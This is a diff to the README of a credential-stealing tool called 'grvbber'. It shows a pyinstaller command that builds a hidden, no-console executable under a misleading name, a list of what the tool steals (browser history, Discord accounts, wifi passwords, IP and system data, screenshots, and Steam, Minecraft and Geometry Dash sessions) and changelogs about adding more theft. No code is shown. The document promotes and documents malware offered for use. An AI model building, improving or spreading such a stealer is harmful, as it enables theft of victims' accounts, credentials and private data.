@@ -22,7 +22,7 @@ pyinstaller --onefile --noconsole --name CharlieKirk --i NONE grvbber.py
 - Gets browsing history (chromium/firefox)
 - Gets discord accounts (no billing info and subscription info)
 - Gets system information and ip address
-- Screenshots a system
+- Screenshots the system
 - Gets wifi passwords
 - Gets minecraft and steam sessions (no session validating yet)
 - Gets geometry dash sessions
@@ -35,7 +35,7 @@ i also plan on improving the builder and not making it console based
 
 changelog 2026-04-06:
 - fixed browser data collection not being optional
-- added geometry dash session 
+- added geometry dash sessions st34ling 
 
 changelog 2026-04-07:
 - added v20 support; although i kinda stole it (only for 10 browsers)
